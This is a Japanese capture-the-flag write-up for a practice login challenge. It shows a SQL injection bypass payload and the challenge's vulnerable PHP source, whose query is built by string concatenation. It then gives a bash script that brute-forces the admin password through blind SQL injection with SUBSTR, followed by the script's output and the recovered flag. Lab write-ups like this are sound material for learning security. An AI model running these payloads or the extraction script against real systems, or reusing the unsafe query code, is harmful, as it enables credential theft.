Login 120pt
----------------

問題
----
> http://ctfq.sweetduet.info:10080/~q6/

解き方
-----

アクセスしてみます。

```html
$ curl http://ctfq.sweetduet.info:10080/~q6/
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
        <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
          </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value=""></div>
      <div>Pass: <input type="text" name="pass" value=""></div>
      <div><input type="submit"></div>
    </form>
      </body>
</html>
```

SQLインジェクションしてみます。

```bash
$ curl -Ss -XPOST http://ctfq.sweetduet.info:10080/~q6/ -d "id=admin&pass='OR 1=1--"
```

成功します。出力は見にくいのでブラウザからの整形したものを貼ります。

```php
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```

パスワードを推測する必要があるようです。

SQLの結果が出力されていないので、`パスワードを表示すること`は難しそうです。

ブラインドSQLインジェクションでしょう。

passの文字を substr関数で切り出して、合致するかどうかを出力のHTMLから読み取れば良いです。

```bash
CHARS='`1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^*()_+-{}|[]\:";<>?,./'
password=''
for len in $(seq 25);do
    for i in $(seq 0 ${#CHARS});do
        char="$password${CHARS:i:1}"
        pass="' OR SUBSTR(pass, 1, $len) = '$char';--"
        res=$(curl -Ss -XPOST http://ctfq.sweetduet.info:10080/~q6/ -d "id=admin&pass=$pass")
        if [ ! -z "$(echo "$res" |grep "Congratulations")" ];then
            echo "success: $char"
            if [ "$password" = "$char" ];then
                echo "ans: $password"
                exit
            fi
            password=$char
            break
        fi
    done
done
```

```bash
$ ./solve.sh
success: F
success: FL
success: FLA
success: FLAG
success: FLAG_
success: FLAG_K
success: FLAG_Kp
success: FLAG_KpW
success: FLAG_KpWa
success: FLAG_KpWa4
success: FLAG_KpWa4j
success: FLAG_KpWa4ji
success: FLAG_KpWa4ji3
success: FLAG_KpWa4ji3u
success: FLAG_KpWa4ji3uZ
success: FLAG_KpWa4ji3uZk
success: FLAG_KpWa4ji3uZk6
success: FLAG_KpWa4ji3uZk6T
success: FLAG_KpWa4ji3uZk6Tr
success: FLAG_KpWa4ji3uZk6TrP
success: FLAG_KpWa4ji3uZk6TrPK
success: FLAG_KpWa4ji3uZk6TrPK
ans: FLAG_KpWa4ji3uZk6TrPK
```

FLAG
-----
`FLAG_KpWa4ji3uZk6TrPK`

